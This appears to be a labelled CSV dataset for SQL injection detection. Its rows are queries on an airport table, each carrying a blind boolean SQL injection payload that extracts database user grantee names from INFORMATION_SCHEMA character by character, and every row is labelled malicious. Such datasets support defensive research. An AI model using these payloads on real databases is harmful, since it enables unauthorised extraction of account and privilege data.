full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>104-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),28,1))>112-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),29,1))>112-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),26,1))>100-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>108-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),28,1))>120-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),29,1))>120-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),26,1))>102-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>110-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),28,1))>116-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),29,1))>116-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),26,1))>103-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>111-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),28,1))>114-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),29,1))>114-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>96-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),29,1))>115-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),28,1))>115-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>48-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>24-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>36-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>42-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>39-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>37-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>38-- pCXa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>51-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>48-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>49-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>50-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>51-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>54-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>56-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>55-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>51-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>48-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>9-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>64-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>64-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>64-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>64-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>32-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>48-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>120-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>120-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>40-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>104-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>124-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>116-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>108-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>36-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>122-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>110-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>38-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>114-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>121-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>109-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>39-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>115-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>96-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>48-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>112-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>120-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>104-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>24-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>120-- zxeG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>116-- zxeG""",1,airport-S3,Unknown,Unknown
